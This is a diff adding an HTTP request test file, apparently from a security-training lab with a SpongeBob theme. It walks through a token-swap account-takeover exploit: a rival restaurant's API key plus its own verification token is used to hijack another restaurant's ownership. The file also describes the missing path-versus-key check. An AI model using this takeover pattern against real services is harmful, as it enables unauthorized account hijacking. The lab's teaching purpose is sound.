@@ -1,0 +1,68 @@
+# @import ../common/setup.http
+@host = {{base_host}}/v307
+@mailpit = http://127.0.0.1:8025/api/v1
+
+# HYPOTHETICAL v308 FIX: Handler verifies API key matches path restaurant
+#
+# In a fixed version, the PATCH /restaurants/{id} handler would verify that
+# the authenticated restaurant (from API key) matches the path parameter
+# BEFORE accepting any token-based updates.
+#
+# NOTE: This fix is NOT implemented in v307 - the exploit still works.
+# This file documents the EXPECTED behavior after the fix is applied.
+
+### Step 1: Request domain verification for Chum Bucket
+POST /restaurants
+Content-Type: application/json
+
+{
+    "name": "Get Token",
+    "domain": "chum-bucket.sea"
+}
+
+?? status == 200
+
+
+### Step 2: Get the verification token
+GET {{mailpit}}/messages?limit=1
+
+@email_id = {{response.parsedBody.messages[0].ID}}
+
+
+### Step 3: Extract the Chum Bucket token
+GET {{mailpit}}/message/{{email_id}}
+
+@chum_token = {{response.parsedBody.Text.match(/token=([a-zA-Z0-9\-_.]+)/)[1]}}
+
+
+### Step 4: Verify Krusty Krab ownership before attack
+GET /restaurants/1/
+
+# @assert response.parsedBody.owner_email.includes("krusty")
+
+
+### Step 5: BLOCKED - Plankton's token swap attack fails
+# In v308, the handler would check: g.restaurant_id (from API key) == restaurant_id (from path)
+# Plankton's Chum Bucket API key (restaurant 2) doesn't match path (/restaurants/1)
+PATCH /restaurants/1
+X-API-Key: {{chum_bucket_api_key}}
+Content-Type: application/json
+
+{
+    "domain": "chum-bucket.sea",
+    "token": "{{chum_token}}"
+}
+
+# EXPECTED (when fix implemented): Authorization error - API key doesn't match path
+# CURRENT BEHAVIOR (v307): Exploit works - Krusty Krab gets hijacked
+?? status == 200
+
+
+### Step 6: Krusty Krab is STILL hijacked (fix not yet implemented)
+# When v308 is implemented, this assertion should check that owner is UNCHANGED
+GET /restaurants/1/
+
+# Current: Hijacked to admin@chum-bucket.sea
+# After fix: Should still be mr.krabs@krusty-krab.sea
+?? js response.parsedBody.owner_email.includes("chum-bucket")
+
